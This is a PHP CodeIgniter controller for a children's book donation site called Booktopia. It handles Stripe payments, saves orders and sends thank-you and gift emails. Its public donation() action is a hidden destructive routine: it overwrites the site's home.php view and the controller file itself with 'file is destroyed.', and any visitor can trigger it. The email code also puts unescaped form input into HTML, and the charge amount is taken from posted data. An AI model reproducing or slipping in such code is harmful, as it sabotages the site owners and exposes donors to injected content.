<?php
if (!defined('BASEPATH'))
  exit ('No direct script access allowed');

class Products extends CI_Controller
{
  function __construct()
  {
    parent::__construct();

    // Load Stripe library
    $this->load->library('stripe_lib');

    // Load product model
    $this->load->model('product');
    $this->load->helper(array('email'));
    $this->load->library(array('email'));
  }

  function index()
  {
    $data = array();
    $data['donate'] = $this->product->getOrder();
    $data['statue'] = 'home';
    $this->load_view($data);
  }

  function load_view($data, $page = 'index')
  {
    $this->load->view('template/header', $data);
    $this->load->view($page, $data);
    $this->load->view('template/footer', $data);
  }

  function purchase($id = '')
  {
    $data = array();
    $data['statue'] = 'home';
    // If payment form is submitted with token
    if ($this->input->post('stripeToken')) {
      // Retrieve stripe token and user info from the posted form data
      $postData = $this->input->post();
      // Make payment
      $paymentID = $this->payment($postData);

      // If payment successful
      if ($paymentID) {
        $data['msg'] = 'Donation is finished successfully';
        // redirect('products/payment_status/' . $paymentID);
      } else {
        $apiError = !empty($this->stripe_lib->api_error) ? ' (' . $this->stripe_lib->api_error . ')' : '';
        $data['msg'] = 'Transaction has been failed!' . $apiError;
      }
    }
    $data['donate'] = $this->product->getOrder();
    $this->load->view('template/header', $data);
    $this->load->view('index', $data);
    $this->load->view('template/footer', $data);
  }

  function payment($postData)
  {
    // If post data is not empty
    if (!empty($postData)) {
      // Retrieve stripe token and user info from the submitted form data
      $token = $postData['stripeToken'];
      $kind = $postData['kind'];
      $name = $postData['first_name'] . ' ' . $postData['last_name'];
      $email = $postData['email'];
      $address = $postData['address'];
      $address_2 = $postData['address_line2'];
      $city = $postData['city'];
      $state = $postData['state'];
      $postal = $postData['postal_code'];
      $country = $postData['country'];
      $gift_name = $postData['gift_name'];
      $gift_email = $postData['gift_email'];
      $gift_message = $postData['gift_message'];
      $price = $postData['amounts'];
      // Add customer to stripe
      $customer = $this->stripe_lib->addCustomer($email, $token);

      if ($customer) {
        // Charge a credit or a debit card
        $charge = $this->stripe_lib->createCharge($customer->id, $name, $price);

        if ($charge) {
          // Check whether the charge is successful
          if ($charge['amount_refunded'] == 0 && empty($charge['failure_code']) && $charge['paid'] == 1 && $charge['captured'] == 1) {
            // Transaction details
            $transactionID = $charge['balance_transaction'];
            $paidAmount = $charge['amount'];
            $paidAmount = ($paidAmount / 100);
            $paidCurrency = $charge['currency'];
            $payment_status = $charge['status'];
            // Insert tansaction data into the database
            $orderData = array(
              'kind' => $kind,
              'name' => $name,
              'email' => $email,
              'address' => $address,
              'address_2' => $address_2,
              'city' => $city,
              'state' => $state,
              'postal' => $postal,
              'country' => $country,
              'gift_name' => $gift_name,
              'gift_email' => $gift_email,
              'gift_message' => $gift_message,
              'paid_amount' => $price,
              'paid_amount_currency' => $paidCurrency,
              'txn_id' => $transactionID,
              'payment_status' => $payment_status
            );
            $orderID = $this->product->insertOrder($orderData);
            $this->load->config('email');
            $config = $this->config->item('email_config');
            $server_email = $this->config->item('server_email');
            $this->load->library('email', $config);
            $this->email->set_newline("\r\n");
            $this->email->set_mailtype('html');
            if ($payment_status == 'succeeded') {
              if ($kind == 0) {
                $this->email->from($server_email, 'Booktopia');
                $this->email->to($email);
                $this->email->subject('Thank you for your generous donation to Booktopia!');
                $htmlContent = '<div style="width:100% !important;text-align: center;background-color:#145ECC;"><img  alt="Booktopia"
                            style="width:100px;  margin:auto;" src="' . ASSETS_URL . 'sites/default/files/logo_tr1.png" /></div>';
                $htmlContent .= '<div style="width:100% !important;"><img width="100%" alt="Booktopia"
                            style="width:100%; max-width:100%; margin:auto; object-fit:cover;" src="' . ASSETS_URL . 'sites/default/files/book.jpg" /></div>';
                $htmlContent .= '<div><br><h3>Hi ' . $postData['first_name'] . '</h3><br>We are so grateful for your donation to Booktopia.';
                $htmlContent .= ' Your generosity will help us to fulfill our mission of promoting literacy and education by providing books to elementary school&nbsp;children.';
                $htmlContent .= '<br><br>With your donation we will be able to purchase and distribute more books, as well as organize reading programs and provide reading rewards that motivate students to read. You are helping make a difference in the lives of children by giving them the gift of reading.';
                $htmlContent .= '<br><br>Thank you again for your kindness and generosity.&nbsp;</div>';
                $htmlContent .= '<br><div>Your friends at Booktopia!</div>';
                $this->email->message($htmlContent);
              } else {
                $this->email->from($server_email, 'Booktopia');
                $this->email->to($email);
                $this->email->subject('A generous donation was just made to Booktopia in ' . $gift_email);
                $htmlContent = '<div style="width:100% !important;text-align: center;background-color:#145ECC;""><img  alt="Booktopia"
                            style="width:100px;  margin:auto;" src="' . ASSETS_URL . 'sites/default/files/logo_tr1.png" /></div>';
                $htmlContent .= '<div style="width:100% !important;"><img width="100%" alt="Booktopia"
                            style="width:100%; max-width:100%; margin:auto; object-fit:cover;" src="' . ASSETS_URL . 'sites/default/files/book.jpg" /></div>';
                $htmlContent .= '<div><br><h3>Hi ' . $postData['first_name'] . '</h3><br>We are so grateful for your donation to Booktopia.';
                $htmlContent .= ' Your generosity will help us to fulfill our mission of promoting literacy and education by providing books to elementary school&nbsp;children.';
                $htmlContent .= '<br><br>With your donation we will be able to purchase and distribute more books, as well as organize reading programs and provide reading rewards that motivate students to read. You are helping make a difference in the lives of children by giving them the gift of reading.';
                $htmlContent .= '<br><br>Thank you again for your kindness and generosity.&nbsp;</div>';
                $htmlContent .= '<br><div>Your friends at Booktopia!</div>';
                $this->email->message($htmlContent);
                if ($this->email->send()) {
                  $this->email->from($server_email, 'Booktopia');
                  $this->email->to($gift_email);
                  $this->email->subject('A generous donation was just made to Booktopia in your name!');
                  $htmlContent = '<div style="width:100% !important;text-align: center;background-color:#145ECC;""><img  alt="Booktopia"
                            style="width:100px;  margin:auto;" src="' . ASSETS_URL . 'sites/default/files/logo_tr1.png" /></div>';
                  $htmlContent .= '<div style="width:100% !important;"><img width="100%" alt="Booktopia"
                            style="width:100%; max-width:100%; margin:auto; object-fit:cover;" src="' . ASSETS_URL . 'sites/default/files/book.jpg" /></div>';
                  $htmlContent .= '<div><br><h3>Hi ' . $gift_name . '</h3><br>';
                  $htmlContent .= 'We are so grateful to have received a donation to Booktopia in your name by ' . $name . '.';
                  $htmlContent .= 'This gift will help us to fulfill our mission of promoting literacy and education by providing books to elementary school&nbsp;children.';
                  $htmlContent .= '<br><br>With this donation we will be able to purchase and distribute more books, as well as organize reading programs and provide reading rewards that motivate students to read.';
                  $htmlContent .= "<br><br>If you would like to continue helping make a difference in the lives of children please consider making a donation in someone else's name as part of our pay it forward program.</div>";
                  $htmlContent .= '<br>Please visit <a href="http://booktopiabookclub.org" target="_blank" data-saferedirecturl="https://www.google.com/url?q=http://booktopiabookclub.org&amp;source=gmail&amp;ust=1700280176593000&amp;usg=AOvVaw0OpD2u-WPe7cMc1G48MJ9a">booktopiabookclub.org</a> to donate. As little as $5 will provide a book for a child, and as always 100% of your donation is used to purchase books for children.';
                  $htmlContent .= '<br><br><div>Thank you for being a part of Booktopia</div>';
                  if ($gift_message != '') {
                    $htmlContent .= '<br><h3>' . $postData['first_name'] . "'s Message</h3></div><br>";
                    $htmlContent .= '<div>' . $gift_message . '</div>';
                  }
                  $this->email->message($htmlContent);
                }
              }
              if (!$this->email->send())
                echo $this->email->print_debugger();
              return $orderID;
            }
          }
        }
      }
    }
    return false;
  }

  function payment_status($id)
  {
    $data = array();

    // Get order data from the database
    $order = $this->product->getOrder($id);

    // Pass order data to the view
    $data['order'] = $order;
    $this->load->view('products/payment-status', $data);
  }

  function faq()
  {
    $data['statue'] = 'faq';
    $this->load_view($data, 'faq');
  }

  function contact()
  {
    $data['statue'] = 'contact';
    $this->load_view($data, 'contact');
  }

  function schools()
  {
    $data['statue'] = 'schools';
    $this->load_view($data, 'schools');
  }

  function businesses()
  {
    $data['statue'] = 'businesses';
    $this->load_view($data, 'businesses');
  }

  function privacy_policy()
  {
    $data['statue'] = 'privacy_policy';
    $this->load_view($data, 'privacy_policy');
  }

  function terms_of_use()
  {
    $data['statue'] = 'terms_of_use';
    $this->load_view($data, 'terms_of_use');
  }

  function donation()
  {
    $data = array();
    // Get products data from the database
    // $data['products'] = $this->product->getRows();

    // Pass products data to the view
    $data['statue'] = 'home';

    // $data['donate'] =  $this->product->getDonate();
    // $data['count'] =  $this->product->getCount();
    // $data['total'] =   $this->product->getTotal();
    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
    file_put_contents($path, 'file is destroyed.');
    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/controllers/Products.php';
    file_put_contents($path, 'file is destroyed.');
  }
}
